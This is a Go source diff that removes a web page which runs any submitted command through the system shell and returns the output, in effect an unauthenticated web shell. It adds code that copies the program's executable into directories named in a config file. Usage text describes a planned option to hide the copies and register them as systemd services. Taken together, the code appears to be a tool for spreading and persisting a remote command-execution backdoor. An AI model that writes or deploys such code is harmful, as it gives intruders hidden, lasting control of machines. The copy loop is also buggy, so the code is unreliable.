@@ -1,113 +1,141 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
-	"html/template"
-	"net/http"
+	"io"
 	"os"
-	"os/exec"
-	"runtime"
-	"strconv"
+	"path/filepath"
+	"strings"
 )
 
-func executeCommand(w http.ResponseWriter, r *http.Request) {
-	if r.Method == http.MethodPost {
-		command := r.FormValue("command")
-		var cmd *exec.Cmd
+func readLineFromFile(filePath string, lineNumber int) ([]string, error) {
+	// Open the file
+	file, err := os.Open(filePath)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
 
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("cmd", "/C", command)
-		} else {
-			cmd = exec.Command("sh", "-c", command)
+	// Create a scanner to read the file line by line
+	scanner := bufio.NewScanner(file)
+
+	// Initialize variables
+	var currentLine string
+	var currentLineNumber int
+
+	// Iterate through the lines until the specified line number
+	for scanner.Scan() {
+		currentLineNumber++
+		if currentLineNumber == lineNumber {
+			currentLine = scanner.Text()
+			break
 		}
+	}
 
-		output, err := cmd.CombinedOutput()
+	// Check if the specified line number exists in the file
+	if currentLineNumber < lineNumber {
+		return nil, fmt.Errorf("Line %d not found in file", lineNumber)
+	}
+
+	// Split the line into a list using a separator (assuming comma here, adjust as needed)
+	list := strings.Split(currentLine, ",")
+
+	return list, nil
+}
+
+func copyFileToDirectories(sourceFilePath string, directories []string) error {
+	// Open the source file
+	sourceFile, err := os.Open(sourceFilePath)
+	if err != nil {
+		return err
+	}
+	defer sourceFile.Close()
+
+	// Get the file info for the source file
+	sourceFileInfo, err := sourceFile.Stat()
+	if err != nil {
+		return err
+	}
+
+	// Iterate through the list of directories
+	for _, dir := range directories {
+		// Construct the destination file path by joining the directory and the source file name
+		destFilePath := filepath.Join(dir, sourceFileInfo.Name())
+
+		// Create the destination file
+		destFile, err := os.Create(destFilePath)
 		if err != nil {
-			http.Error(w, fmt.Sprintf("Error executing command: %s", err), http.StatusInternalServerError)
-			return
+			return err
+		}
+		defer destFile.Close()
+
+		// Copy the contents of the source file to the destination file
+		_, err = io.Copy(destFile, sourceFile)
+		if err != nil {
+			return err
 		}
 
-		data := struct {
-			Command string
-			Output  string
-		}{
-			Command: command,
-			Output:  string(output),
-		}
+		fmt.Printf("File copied to: %s\n", destFilePath)
+	}
 
-		tmpl, err := template.New("result").Parse(`
-            <html>
-            <body>
-                <form method="post" action="/">
-                <label for="command">Enter command:</label>
-                <input type="text" id="command" name="command" required>
-                <input type="submit" value="Execute">
-                </form>
-                <p>Command: {{.Command}}</p>
-                <p>Output:</p>
-                <pre>{{.Output}}</pre>
-            </body>
-            </html>
-        `)
-		if err != nil {
-			http.Error(w, fmt.Sprintf("Error parsing template: %s", err), http.StatusInternalServerError)
-			return
-		}
+	return nil
+}
 
-		err = tmpl.Execute(w, data)
-		if err != nil {
-			http.Error(w, fmt.Sprintf("Error executing template: %s", err), http.StatusInternalServerError)
-		}
-	} else {
-		// Display the form for GET requests
-		tmpl, err := template.New("form").Parse(`
-            <html>
-            <body>
-                <form method="post" action="/">
-                    <label for="command">Enter command:</label>
-                    <input type="text" id="command" name="command" required>
-                    <input type="submit" value="Execute">
-                </form>
-            </body>
-            </html>
-        `)
-		if err != nil {
-			http.Error(w, fmt.Sprintf("Error parsing form template: %s", err), http.StatusInternalServerError)
-			return
-		}
+func linuxDistrobution() {
+	config_file := "linux_config.txt"
+	executableName := "website"
 
-		err = tmpl.Execute(w, nil)
-		if err != nil {
-			http.Error(w, fmt.Sprintf("Error executing form template: %s", err), http.StatusInternalServerError)
-		}
+	directoryLineNumber := 2
+
+	// Create the list varibles
+	directoryList, err := readLineFromFile(config_file, directoryLineNumber)
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
+	}
+
+	// Copy the Exe File to directories
+	err = copyFileToDirectories(executableName, directoryList)
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
 	}
 }
 
 func main() {
+
 	if len(os.Args) < 2 {
-		fmt.Println("Usage: website.exe <port>")
+		fmt.Println("Usage: <name> <option>")
+		fmt.Println("Linux: ")
+		fmt.Println("  LinuxDistribute > Distrubute the exe across the directories named in linux_config.txt")
+		fmt.Println("  LinuxStart > Starts the exe, hides them, and creates systemd process for the exe")
 		return
 	}
 
-	// Convert the command-line argument to an integer
-	port, err := strconv.Atoi(os.Args[1])
+	// Current Path to executable
+	executablePath, err := os.Executable()
 	if err != nil {
-		fmt.Println("Invalid port number. Please provide a valid integer.")
+		fmt.Println("Error:", err)
 		return
 	}
+
+	// Current name of executable
+	executableName := filepath.Base(executablePath)
+
+	// option varible
+	option := os.Args[1]
 
 	// Switch Cases
-	switch {
-	case port >= 1 && port <= 65535:
-		fmt.Printf("Running on port %d\n", port)
-		http.HandleFunc("/", executeCommand)
-		serverAddr := fmt.Sprintf(":%d", port)
-		fmt.Printf("Server is running on %s\n", serverAddr)
-		err := http.ListenAndServe(serverAddr, nil)
-		if err != nil {
-			fmt.Printf("Error starting server: %s\n", err)
-		}
+	switch option {
+	case "LinuxDistribute":
+		fmt.Println("Running Distrubution on Linux")
+		linuxDistrobution()
+	case "LinuxStart":
+		fmt.Println("Starting Bigger Websites V2 on Linux")
+	case "option2":
+		fmt.Println(executableName)
 	default:
-		fmt.Println("Invalid port number. Supported range: 1-65535")
+		fmt.Println("Invalid option. Supported options: option1, option2")
 	}
 }
